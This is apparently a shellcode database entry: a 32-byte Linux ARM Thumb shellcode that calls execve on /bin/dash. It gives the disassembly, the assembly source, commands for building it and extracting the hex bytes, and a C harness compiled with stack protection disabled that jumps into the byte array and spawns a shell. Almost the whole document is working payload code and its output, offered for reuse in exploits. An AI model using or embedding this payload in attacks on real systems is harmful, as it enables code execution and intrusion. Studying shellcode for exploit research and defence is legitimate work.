# Title:  Linux/ARM - execve /bin/dash Shellcode (32 bytes)
# Date:   2020-06-08
# Category: Shellcode
# Tested: armv7l (32-bit)(Raspberry Pi 2 Model B) (OS: Raspbian Buster Lite)
# Author: Anurag Srivastava
# Description: execve shellcode

/*
## Objdump

pi@raspberrypi:~/hex $ objdump -d ed1

ed1:     file format elf32-littlearm


Disassembly of section .text:

00010054 <_start>:
   10054:       e28f3001        add     r3, pc, #1
   10058:       e12fff13        bx      r3
   1005c:       a002            add     r0, pc, #8      ; (adr r0, 10068 <_start+0x14>)
   1005e:       1a49            subs    r1, r1, r1
   10060:       1c0a            adds    r2, r1, #0
   10062:       7242            strb    r2, [r0, #9]
   10064:       270b            movs    r7, #11
   10066:       df01            svc     1
   10068:       6e69622f        .word   0x6e69622f
   1006c:       7361642f        .word   0x7361642f
   10070:       46c05968        .word   0x46c05968
pi@raspberrypi:~/hex $ nano ed1.s

##code

pi@raspberrypi:~/hex $ cat ed1.s
.section .text
.global _start

_start:
        .ARM
        add r3, pc, #1
        bx  r3

        .THUMB
        add r0, pc, #8
        sub r1, r1, r1
        mov r2, r1
        strb r2, [r0, #9]
        mov r7, #11
        svc #1

.ascii "/bin/dashY"

pi@raspberrypi:~/hex $ as ed1.s -o ex.o
pi@raspberrypi:~/hex $ ld -N ex.o -o exdash
pi@raspberrypi:~/hex $ objcopy -O binary exdash exdash.bin
pi@raspberrypi:~/hex $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' exdash.bin
\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x1a\x0a\x1c\x42\x72\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x59\xc0\x46


## Steps to compile given shellcode C program file
pi@raspberrypi:~ gcc -fno-stack-protector -z execstack tada.c -o tada
pi@raspberrypi:~/hex $ ./tada
Shellcode Length:  32
$ whoami
pi
$ exit

*/


#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x1a\x0a\x1c\x42\x72\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x59\xc0\x46";
main(){

        printf("Shellcode Length:  %d\n", (int)strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;

        ret();
}